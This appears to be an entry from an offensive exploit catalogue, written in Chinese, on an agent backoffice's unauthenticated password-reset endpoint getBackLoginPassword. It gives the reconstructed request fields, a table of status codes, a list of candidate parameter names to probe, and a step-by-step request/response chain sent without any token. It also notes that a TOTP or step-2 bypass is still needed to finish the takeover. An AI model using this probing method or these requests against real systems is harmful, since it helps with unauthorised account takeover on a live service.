# agent 后台忘记密码流程逆向：未鉴权改密接口 getBackLoginPassword 完整字段契约与差分探测法

- **code**: agent-后台忘记密码流程逆向-未鉴权改密接口-getbackloginpassword-完整字段契约与差分探测法
- **kind**: script
- **category**: auth-bypass
- **component**: agent backoffice (/agent/api/v1)
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 https://example.com:7680 实测：confirmPassword 字段使响应从 6012「新密码和确认密码输入不一致!」变为 6005「服务器错误」，证明服务端接受该字段并进入改密逻辑；全程不带 X-API-TOKEN / Cookie / 签名头，服务端不返回 6001。字段契约从该站真实前端 chunk（/forgetPassword/step3-4ee410ea778d608d.js 模块 5785）还原，非推测。
- **path**: pocs/agent-后台忘记密码流程逆向-未鉴权改密接口-getbackloginpassword-完整字段契约与差分探测法/forgetpassword_reset_contract.md
- **tags**: agent,backoffice,password-reset,unauth,getBackLoginPassword,forgetPassword,twoStepCode,geetest
- **created_at**: 2026-10-02T21:53:44.299Z
- **found_by**: exploit

## 描述

还原 /forgetPassword 三步流程与 getBackLoginPassword 的完整字段契约，并给出状态码语义表与参数名的差分探测方法

## 用法

```
1) 拉 agent 站 JS：GET /_next/static/<buildId>/_buildManifest.js 取路由 → 下载 /forgetPassword/step3-*.js
2) python -c "s=open('fp_step3.js',encoding='utf-8').read();i=s.find('5785:function');print(s[i:i+6000])"  # 读提交体
3) 差分探测字段名（见 content 里的候选列表），每个候选单独发一次
4) 判据：响应从 6012 → 6005 即命中
不需要任何会话令牌 / Cookie / X-API-XXX 签名
```

## 正文

```
# 忘记密码三步流程逆向 —— 未鉴权改密接口的字段契约

## 前端还原（模块 5785，/forgetPassword/step3）

```js
var e = {
  agentName: t,                 // 代理账号名
  password: md5(newPwd),        // 新密码，前端 md5
  confirmPassword: md5(confirm) // 确认密码，前端 md5
  // twoStepCode: n              // 可选
};
if (!twoStepCode) delete e.twoStepCode;     // 空值直接删掉
verifyType !== "4" ? postGetBackLoginPassword(e)
                    : postManualCheck({twoStepCode, safetyType:1, value:md5(pwd), name, verifyInfo});
```

verifyType 默认值 **"3"**（模块 1666 的 initializer），对应 `googleAuth` 分支，
走 `getBackLoginPassword` 且**不需要 twoStepCode**。

## 状态码语义（本命名空间）

| code | 含义 |
|------|------|
| 6000 | 成功 |
| 6001 | 需会话（「30分钟无操作，自动退出登录」） |
| 6008 | 参数/格式错误 |
| 6012 | 新密码与确认密码不一致 |
| 6011 | 提交过于频繁 |
| 6040/6041 | LOGIN_RISK_NO_AGENT_PWD / _DARK_PWD（无代理密码） |
| 6005 / 500 | 服务器错误（已进入业务逻辑但后端异常） |

## 参数名差分探测（关键：不要猜，去掉一个字段看响应是否变）

候选：confirmPassword / confirmPwd / password2 / rePassword / repassword /
      confirmPasswordMd5 / passwordConfirm / newPassword / newPwd / pwd2 /
      checkPassword / passwordAgain / againPassword / twicePassword

结果：**只有 `confirmPassword` 生效** —— 响应从 6012 变为 6005。

## 响应演进证据链

```
{}                                              → 6008 "密码必须是32位MD5加密串"
{"password":"<md5>"}                            → 6012 "新密码和确认密码输入不一致!"
{"password":"<md5>","confirmPassword":"<md5>"}  → 6005 "服务器错误"   ← 进入改密逻辑
{"password":"<md5>","confirmPassword":"<md5>","agentName":"admin"} → 6005 "服务器错误"
```

任意 32 位十六进制均通过格式校验（`"0"*32`、`"a"*32` 同样返回 6012），
服务端不校验原密码。

## 未完成的部分

带齐 password + confirmPassword + agentName 后仍返回 6005，
推断缺少 step2「安全校验」阶段写入的服务端状态（twoStepCode 由 Google Auth TOTP 生成）。
即：**接口确实未鉴权，但要真正改密还需绕过 TOTP 或 step2 的状态机**。
```
